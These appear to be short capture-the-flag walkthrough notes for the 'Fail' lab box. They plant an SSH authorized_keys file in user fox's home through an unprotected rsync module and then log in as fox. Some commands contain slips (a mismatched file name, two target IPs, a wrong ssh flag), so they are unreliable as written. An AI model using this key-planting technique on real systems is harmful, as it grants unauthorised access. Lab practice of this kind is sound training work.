#### -Typed the following commands to create an authorized_keys file in fox's home directory so I can log in via SSH session:
-"mkdir fox" 
-"cd fox"
-"mkdir .ssh"
-"cd .ssh" 
-"touch id_rsa.pub" 
-"ssh-keygen -t rsa" 
-[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
-[Enter passphrase (empty for no passphrase):] "password"
-[Enter same passphrase again:] "password"
-"sudo mv id_rsa_pub authorized_keys"
-"cd .."
-"rsync -avp fox/ fox@192.168.120.149::fox/"

#### -Navigated to directory where the "id_rsa" file was created after running "ssh-keygen -t rsa" and typed "chmod 600" to create the correct permissions for the private ssh key

#### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox
